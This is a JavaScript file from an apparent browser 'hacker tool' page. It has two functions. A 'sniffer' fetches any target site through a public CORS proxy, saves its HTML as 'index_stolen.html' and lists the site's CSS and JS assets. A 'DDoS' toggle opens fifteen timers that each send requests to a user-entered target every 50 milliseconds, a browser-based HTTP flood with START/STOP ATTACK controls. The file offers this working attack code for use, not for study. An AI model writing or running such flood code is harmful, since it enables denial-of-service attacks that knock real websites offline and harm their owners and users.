// --- 1. ULTRA SNIFFER (HTML + CSS + JS) ---
async function ultraSniffer() {
    const target = document.getElementById('target-sniff').value;
    if(!target) return alert("Target Link Mana?");
    
    alert("Sniffing HTML, CSS, & JS... Please Wait.");
    
    try {
        const proxy = `https://api.allorigins.win/get?url=${encodeURIComponent(target)}`;
        const res = await fetch(proxy);
        const data = await res.json();
        const html = data.contents;

        // Download HTML
        downloadAsset(html, "index_stolen.html");

        // Simple Regex buat nyari CSS dan JS
        const cssMatches = html.match(/href="([^"]+\.css)"/g) || [];
        const jsMatches = html.match(/src="([^"]+\.js)"/g) || [];

        alert(`Found ${cssMatches.length} CSS and ${jsMatches.length} JS assets! Check console to copy links.`);
        console.log("--- STOLEN ASSETS ---");
        cssMatches.forEach(c => console.log("CSS:", c));
        jsMatches.forEach(j => console.log("JS:", j));

    } catch (e) { alert("Bypass Failed! Website protected."); }
}

function downloadAsset(content, name) {
    const blob = new Blob([content], { type: 'text/plain' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = name;
    a.click();
}

// --- 2. FIXED DDOS LOGIC ---
let isAttacking = false;
let ddosIntervals = [];

function toggleAttack() {
    const btn = document.getElementById('attackBtn');
    const target = document.getElementById('target-ddos').value;
    const stat = document.getElementById('flood-stat');

    if (!isAttacking) {
        if(!target) return alert("Input Target!");
        isAttacking = true;
        btn.innerText = "STOP ATTACK";
        btn.classList.add("btn-stop");
        stat.innerHTML = "<span class='blink'>ATTACKING: SENDING PACKETS...</span>";
        
        // Multi-threading simulation dengan banyak interval
        for(let i=0; i<15; i++) {
            ddosIntervals.push(setInterval(() => {
                fetch(target, { mode: 'no-cors', cache: 'no-store' }).catch(()=>{});
            }, 50));
        }
    } else {
        isAttacking = false;
        btn.innerText = "START ATTACK";
        btn.classList.remove("btn-stop");
        stat.innerText = "STATUS: ABORTED";
        ddosIntervals.forEach(clearInterval);
        ddosIntervals = [];
    }
            }
